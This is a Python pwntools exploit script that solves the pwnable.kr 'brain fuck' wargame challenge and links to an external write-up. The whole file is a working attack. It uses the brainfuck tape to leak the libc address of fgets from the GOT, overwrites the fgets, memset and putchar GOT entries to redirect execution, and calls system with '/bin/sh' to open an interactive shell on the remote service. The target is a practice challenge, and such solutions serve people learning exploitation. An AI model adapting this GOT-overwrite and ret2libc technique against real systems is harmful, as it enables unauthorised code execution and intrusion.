'''
pwnables.kr - brain fuck

Writeup: https://ginjabenjamin.github.io/wargame/2017/06/15/pwnableskr-brain-fuck
'''
from pwn import *

# libc values; readelf -s bf_libc.so | grep [function]
libc = ELF("./bf_libc.so")

offsetSystem = libc.symbols['system'] # = 0x0003a920
offsetFgets = libc.symbols['fgets'] # = 0x0005d540

# Addresses (bf)
bfMain = 0x08048671 # objdump -d bf | grep main
bfDo_brainfuck = 0x080485dc # objdump -d bf | grep do_brainfuck
bfFgets = 0x0804a010
bfMemset = 0x0804a02c
bfTape = 0x0804a0a0

DEBUG = 1

if(len(sys.argv) > 1 and sys.argv[1] == 'pwn'):
    p = remote('pwnable.kr', 9001)
else:
    p = process('./bf')

p.recvuntil('[ ]\n')

# Move from input string (tape) to fgets@GOT
payload = '<'*(bfTape - bfFgets)

# Leak fgets@GOT
payload += '.>'*4                   # Read fgets())
payload += '<'*4                    # Move back to fgets())

# Change fgets@GOT to system@GOT
payload += ',>'*4                   # Overwrite fgets() with system()
payload += '<'*4                    # Move back to fgets())

# Change memset@GOT to fgets@GOT
payload += '>'*(bfMemset - bfFgets) # Move to memset()
payload += ',>'*4                   # Overwrite memset() with fgets()

# Change putchar@GOT to main()
payload += ',>'*4                   # Overwrite putchar() with main()

# Call putchar() which invokes main()
payload += '.'

# Setup attack
p.sendline(payload)

# Read address of fgets()
addrFgets = int(p.recvn(4)[::-1].encode('hex'), 16)
log.info('fgets@GOT: ' + str(addrFgets))

addrSystem = addrFgets - offsetFgets + offsetSystem
#log.info('system: ' + str(hex(addrSystem)))

# Submit our stack frame
p.send(p32(addrSystem))     # Call system()
p.send(p32(addrFgets - offsetFgets + libc.symbols['gets'])) # Canary
p.send(p32(bfMain))         # Return to main()
p.sendline('/bin/sh')       # Argument for system()

p.interactive()
